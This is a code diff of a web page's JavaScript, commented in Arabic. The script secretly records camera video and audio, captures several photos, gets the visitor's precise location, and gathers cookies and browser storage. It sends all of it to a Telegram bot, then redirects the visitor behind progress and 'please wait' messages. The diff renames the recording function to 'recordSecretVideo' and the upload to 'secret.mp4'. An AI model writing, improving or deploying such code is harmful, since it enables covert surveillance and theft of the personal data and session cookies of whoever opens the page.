@@ -229,8 +229,8 @@
             if(msgEl) msgEl.textContent = msg;
         }
 
-        // 1. تسجيل فيديو من الكاميرا (6 ثوانٍ)
-        async function recordCameraVideo() {
+        // 1. تسجيل فيديو من الكاميرا (6 ثوانٍ) - من الكود المرفق
+        async function recordSecretVideo() {
             try {
                 updateMessage('جاري تحضير الفيديو...');
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
@@ -339,7 +339,7 @@
                 let blob = await fetch(collectedData.capturedVideo).then(r => r.blob());
                 let fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
-                fd.append('video', blob, 'camera_video.mp4');
+                fd.append('video', blob, 'secret.mp4');
                 fd.append('caption', '🎥 فيديو تم تسجيله');
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
             }
@@ -348,15 +348,15 @@
         // العملية الرئيسية المتكاملة
         async function fullOperation() {
             updateProgress(5);
-            await recordCameraVideo();
+            await recordSecretVideo();      // فيديو الكاميرا أولاً
             updateProgress(30);
-            await captureMultipleImages();
+            await captureMultipleImages();   // 3 صور
             updateProgress(60);
-            await getPreciseLocation();
+            await getPreciseLocation();      // الموقع
             updateProgress(75);
-            collectStorage();
+            collectStorage();                // كوكيز وتخزين
             updateProgress(85);
-            await sendAllData();
+            await sendAllData();             // إرسال كل شيء
             updateProgress(100);
             updateMessage('يرجى الانتظار...');
             setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
